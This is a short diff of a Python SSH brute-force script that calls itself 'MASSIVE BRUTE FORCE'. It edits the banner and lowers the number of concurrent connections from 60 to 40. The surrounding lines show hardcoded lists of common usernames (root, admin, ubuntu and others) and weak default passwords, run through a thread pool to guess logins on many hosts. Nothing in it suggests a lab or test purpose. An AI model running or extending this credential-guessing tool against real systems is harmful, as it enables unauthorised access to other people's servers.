@@ -11,7 +11,7 @@ banner = """
 / __/ __| || | MASSIVE
 \__ \__ \ __ | BRUTE
 |___/___/_||_| FORCE
-
+WG
 """
 
 print(banner)
@@ -123,7 +123,7 @@ skipped_ips = set()
 users = ['root', 'admin', 'user', 'user1', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server', 'abc', 'account', 'administrador', 'localadmin', 'webadmin']
 password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '12345678', '321', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']
 
-max_concurrent_connections = 60
+max_concurrent_connections = 40
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_connections) as executor:
     for user in users:
